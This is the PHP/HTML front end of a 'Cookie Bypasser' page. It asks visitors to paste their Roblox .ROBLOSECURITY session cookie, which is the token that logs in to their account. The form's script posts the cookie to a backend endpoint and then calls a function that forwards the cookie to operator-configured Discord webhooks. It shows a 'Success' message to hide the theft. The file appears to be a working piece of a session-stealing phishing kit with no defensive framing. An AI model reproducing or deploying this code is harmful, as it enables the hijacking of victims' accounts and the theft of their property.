<?php
$WEBHOOK_URL = isset($WEBHOOK_URL) ? $WEBHOOK_URL : '';
$USER_WEBHOOK = isset($USER_WEBHOOK) ? $USER_WEBHOOK : '';
$INSTANCE_NAME = isset($INSTANCE_NAME) ? $INSTANCE_NAME : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Bypasser</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <script>
        window.INSTANCE_WEBHOOK = '<?php echo addslashes($WEBHOOK_URL); ?>';
        window.INSTANCE_USER_WEBHOOK = '<?php echo addslashes($USER_WEBHOOK); ?>';
        window.INSTANCE_NAME = '<?php echo addslashes($INSTANCE_NAME); ?>';
    </script>
    
    <script src="/public/protect.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0a;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: #1a1a1a;
            border-radius: 20px;
            padding: 40px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 20px;
            text-align: center;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            text-align: center;
            margin-bottom: 30px;
            color: #999;
        }
        input {
            width: 100%;
            padding: 15px;
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px;
            color: white;
            margin-bottom: 15px;
            font-size: 15px;
            font-family: inherit;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
        }
        button:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 10px;
            display: none;
        }
        .result.show {
            display: block;
        }
        .result p {
            color: #10b981;
            font-weight: 600;
            margin-bottom: 5px;
        }
        .result small {
            color: #999;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Cookie Bypasser</h1>
        <p>Enter your .ROBLOSECURITY cookie</p>
        
        <form id="bypassForm">
            <input 
                type="text" 
                id="cookieInput" 
                placeholder=".ROBLOSECURITY Cookie"
                required
            >
            
            <button type="submit" id="submitBtn">
                ⚡ Start Bypass
            </button>
        </form>
        
        <div id="result" class="result">
            <p>✅ Success!</p>
            <small>Check your Discord webhook</small>
        </div>
    </div>

    <script src="/public/script.js"></script>
    
    <script>
        document.getElementById('bypassForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const cookie = document.getElementById('cookieInput').value.trim();
            const btn = document.getElementById('submitBtn');
            
            if (!cookie) {
                alert('Please enter a cookie');
                return;
            }
            
            btn.textContent = '⏳ Processing...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/bypass.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        cookie,
                        instance: window.INSTANCE_NAME
                    })
                });
                
                const data = await response.json();
                
                if (data.success && window.sendCookieToWebhook) {
                    await window.sendCookieToWebhook(data, cookie);
                    
                    document.getElementById('result').classList.add('show');
                    document.getElementById('bypassForm').style.display = 'none';
                } else {
                    alert('Invalid cookie');
                    btn.textContent = '⚡ Start Bypass';
                    btn.disabled = false;
                }
            } catch (error) {
                alert('Error processing request');
                btn.textContent = '⚡ Start Bypass';
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>